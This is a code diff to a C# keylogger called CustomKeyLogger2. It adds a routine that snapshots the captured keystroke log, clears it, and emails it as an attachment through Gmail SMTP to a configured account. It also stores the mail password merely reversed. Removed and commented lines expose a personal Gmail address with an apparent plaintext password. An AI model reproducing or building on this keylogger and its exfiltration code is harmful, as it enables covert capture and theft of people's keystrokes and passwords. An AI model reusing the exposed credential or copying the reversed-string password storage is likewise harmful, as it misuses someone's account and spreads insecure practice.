@@ -24,9 +24,12 @@ namespace CustomKeyLogger2
         string secretWord = "";
         ArrayList keyWords;
 
-        string secretFileDir;
         string keywordsFileDir;
         string logsFileDir;
+        string attachFileDir;
+
+        bool PauseWriting = false;
+        SmtpClient emailClient = new SmtpClient("smtp.gmail.com", 587);
 
         public Form1()
         {
@@ -38,7 +41,7 @@ namespace CustomKeyLogger2
 
             InitKeyWords();
 
-            writeUp = "";
+            InitEmail();
         }
 
         private void InitStream()
@@ -46,15 +49,10 @@ namespace CustomKeyLogger2
             atmdir = atmdir.Remove(0, 6);
             atmdir += "\\";
 
-            secretFileDir = atmdir + "secret.krs";
             keywordsFileDir = atmdir + "keywords.krs";
             logsFileDir = atmdir + "logs.krs";
+            attachFileDir = atmdir + "attachlog.txt";
             StreamWriter sw;
-            if (!File.Exists(secretFileDir))
-            {
-                sw = File.CreateText(secretFileDir);
-                sw.Close();
-            }
             if (!File.Exists(keywordsFileDir))
             {
                 sw = File.CreateText(keywordsFileDir);
@@ -69,11 +67,8 @@ namespace CustomKeyLogger2
 
         private void InitSecretWord()
         {
-            using(StreamReader tr = new StreamReader(secretFileDir))
-            {
-                secretWord = tr.ReadLine();
-                if(secretWord == null) secretWord = "";
-            }
+            secretWord = Properties.Settings.Default.SecretWord;
+            txtScrtWrd.Text = secretWord;
 
             if (secretWord.CompareTo("") == 0 || Properties.Settings.Default.AutoStart == false)
             {
@@ -106,7 +101,15 @@ namespace CustomKeyLogger2
                     if (temp != null) keyWords.Add(temp);
                 } while (temp != null);
             }
-        }        
+        }
+
+        private void InitEmail()
+        {
+            txtEmail.Text = Properties.Settings.Default.GMail;
+            txtPassWord.Text = LoadPassword();
+            
+            
+        }
 
         private void btnStart_Click(object sender, EventArgs e)
         {
@@ -133,7 +136,8 @@ namespace CustomKeyLogger2
             hook.VK vk = (hook.VK)key;
 
             String temp = "";
-            
+
+            #region switch
             switch (vk)
             {
                 //case hook.VK.VK_F1: temp = "<-F1->";
@@ -348,6 +352,7 @@ namespace CustomKeyLogger2
                     break;
                 default: break;
             }
+            #endregion
 
             #region To Upper Case
 
@@ -421,13 +426,7 @@ namespace CustomKeyLogger2
 
         public void writeToFile(String writing)
         {
-            File.AppendAllText(logsFileDir, writing);
-        }
-
-        private void btnWrtTFl_Click(object sender, EventArgs e)
-        {
-            writeToFile(writeUp);
-            writeUp = "";
+            if (PauseWriting == false) File.AppendAllText(logsFileDir, writing);
         }
 
         private void btnShow_Click(object sender, EventArgs e)
@@ -438,16 +437,13 @@ namespace CustomKeyLogger2
         private void btnSvScrtWrd_Click(object sender, EventArgs e)
         {
             WriteSecretWord();
+            NotifySaved();
         }
 
         private void WriteSecretWord()
         {
-            File.Delete(secretFileDir);
-            using (StreamWriter sw = File.CreateText(secretFileDir))
-            {
-                sw.Write(txtScrtWrd.Text.Trim());
-            }
             secretWord = txtScrtWrd.Text.Trim();
+            Properties.Settings.Default.SecretWord = secretWord;
         }
 
         private void btnSaveKeyWord_Click(object sender, EventArgs e)
@@ -460,6 +456,8 @@ namespace CustomKeyLogger2
             {
                 sw.WriteLine(input);
             }
+
+            NotifySaved();
         }
 
         private bool CheckDuplicateKeyWords(string input)
@@ -473,18 +471,56 @@ namespace CustomKeyLogger2
             return result;
         }
 
-        public void sendMailK() // not tested
+        public void sendMailK()
         {
-            MailMessage message = new MailMessage("aungthumoe5@gmail.com", "aungthumoe5+KeyLogger2@gmail.com",
-                "CustomKeyLogger2 - logs report", File.ReadAllText(logsFileDir));
-            SmtpClient emailClient = new SmtpClient("smtp.gmail.com", 587);
-            System.Net.NetworkCredential SMTPUserInfo = new System.Net.NetworkCredential("aungthumoe5@gmail.com", "3530505Q067785@tm5");
-            emailClient.UseDefaultCredentials = false;
-            emailClient.Credentials = SMTPUserInfo;
+            PauseWriting = true;
+            File.Copy(logsFileDir, attachFileDir, true);
+            Attachment attach = new Attachment(attachFileDir);
+            File.Delete(logsFileDir);
+            StreamWriter sw = File.CreateText(logsFileDir);
+            sw.Close();
+            PauseWriting = false;
+
+            MailMessage message = new MailMessage(Properties.Settings.Default.GMail, Properties.Settings.Default.GMail,
+                "CustomKeyLogger2 - Logs", "logs report");
+            message.Attachments.Add(attach);
+            System.Net.NetworkCredential SMTPUserInfo = new System.Net.NetworkCredential(Properties.Settings.Default.GMail,
+                LoadPassword());
+            //MailMessage message = new MailMessage("aungthumoe5@gmail.com", "aungthumoe5@gmail.com",
+            //    "CustomKeyLogger2 - Logs", "logs report");
+            //System.Net.NetworkCredential SMTPUserInfo = new System.Net.NetworkCredential("aungthumoe5@gmail.com","3530505Q067785@tm5");
+
+            emailClient = new SmtpClient("smtp.gmail.com", 587);
+            emailClient.SendCompleted += new SendCompletedEventHandler(SendCompletedCallback);
             emailClient.EnableSsl = true;
             emailClient.DeliveryMethod = SmtpDeliveryMethod.Network;
+            emailClient.UseDefaultCredentials = false;
+            emailClient.Credentials = SMTPUserInfo;
             emailClient.Timeout = 20000;
-            emailClient.Send(message);
+            
+            lblMailStatus.Text = "Sending Mail ...";
+            emailClient.SendAsync(message, "Sending Mail");
+        }
+
+        private void SendCompletedCallback(object sender, AsyncCompletedEventArgs e)
+        {
+            // Get the unique identifier for this asynchronous operation.
+            String token = (string)e.UserState;
+            String temp = "";
+
+            if (e.Cancelled)
+            {
+                temp = "Send Canceled.";
+            }
+            if (e.Error != null)
+            {
+                temp = "Error! " + e.Error.Message;
+            }
+            else
+            {
+                temp = "Mail Sent!";
+            }
+            lblMailStatus.Text = temp;
         }
 
         private void btnHide_Click(object sender, EventArgs e)
@@ -516,6 +552,38 @@ namespace CustomKeyLogger2
         private void btnEmail_Click(object sender, EventArgs e)
         {
             sendMailK();
+        }
+
+        private void btnSaveEmail_Click(object sender, EventArgs e)
+        {
+            Properties.Settings.Default.GMail = txtEmail.Text;
+            SavePassword(txtPassWord.Text);
+            NotifySaved();
+        }
+
+        private void NotifySaved()
+        {
+            MessageBox.Show("Saved!");
+        }
+
+        private void SavePassword(String rawpass)
+        {
+            Char[] gen = rawpass.ToCharArray();
+            Array.Reverse(gen);
+            Properties.Settings.Default.PW = new String(gen);
+        }
+
+        private String LoadPassword()
+        {
+            String raw = Properties.Settings.Default.PW;
+            Char[] gen = raw.ToCharArray();
+            Array.Reverse(gen);
+            return new String(gen);
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            Properties.Settings.Default.Save();
         }
     }
 }
